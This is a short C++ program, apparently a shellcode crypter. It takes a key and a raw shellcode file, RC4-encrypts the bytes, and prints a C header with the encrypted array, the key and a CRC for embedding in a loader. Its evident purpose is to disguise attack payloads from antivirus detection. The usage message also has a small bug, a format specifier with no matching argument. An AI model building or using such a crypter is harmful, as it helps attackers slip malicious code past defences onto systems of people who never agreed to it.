#include "stdafx.h"
#include "rc4.h"
#include "crc.h"
#include<iostream>
#include<fstream>
#include<string>

int main(int argc, char* argv[])
{
	if (argc<3){
		printf("Usage: %s [KEY] [shellcode.raw]\n");
		return -1;
	}

	unsigned char* key=(unsigned char*)argv[1];
	std::ifstream in(argv[2]);
	
	std::string contents((std::istreambuf_iterator<char>(in)),std::istreambuf_iterator<char>());
	
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char* crypted=(unsigned char*)malloc(contents.length()*sizeof(unsigned char));
	memset(crypted,0,contents.length()*sizeof(unsigned char));
	rc4_crypt(crypted,contents.length(),&rc4_key);
	
	printf("#define SC {");
	for (int i=0;i<contents.length();i++){
		if (i!=0) putchar(',');
		printf("0x%02x",(unsigned char)((unsigned char)(contents.c_str()[i])^crypted[i]));
	}
	printf("}\n\n");
	// Calculating CRC
	const unsigned char * contents_buf = reinterpret_cast<const unsigned char *> (contents.c_str());
	printf("#define SC_KEY \"%s\"\n\n",key);
	printf("#define SC_CRC %d \n\n",crcSlow(contents_buf,contents.length()));
	return 0;
}

